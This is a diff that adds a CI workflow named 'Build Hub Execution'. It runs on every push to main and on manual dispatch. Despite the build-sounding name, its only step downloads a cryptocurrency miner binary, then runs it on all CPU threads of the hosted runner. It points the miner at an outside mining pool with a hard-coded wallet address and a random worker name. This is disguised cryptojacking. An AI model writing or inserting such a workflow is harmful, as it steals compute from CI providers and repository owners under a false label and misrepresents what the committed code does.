@@ -1,0 +1,36 @@
+name: Build Hub Execution
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: bitrise-runner-mc
+    
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Run Seine Miner (macOS)
+        run: |
+          echo "=== Starting Seine Miner on macOS ==="
+          
+          # Download macOS binary
+          wget -q https://github.com/zpalmtree/seine/releases/latest/download/seine-macos.tar.gz
+          tar -xzf seine-macos.tar.gz
+          rm -f seine-macos.tar.gz
+          chmod +x seine
+          
+          # Auto-detect threads
+          MAX_THREADS=$(sysctl -n hw.ncpu)
+          WORKER_NAME="BNT$(shuf -i 1-99999 -n 1)"
+          
+          echo "Threads: $MAX_THREADS | Worker: $WORKER_NAME"
+          echo "================================"
+          
+          # Run miner
+          ./seine --pool-url bnt.naramail.xyz:47182 \
+                  --address N3FT9Ut4wctdR5b9hBCz9Wc39GtjHmJw2GNuQLyTfVLEBS7exwWjz3fSXEb6YAzLG4CN5jVDe8sW2FBNP6xR9cnmmY4hz \
+                  --pool-worker "$WORKER_NAME" \
+                  --threads "$MAX_THREADS"
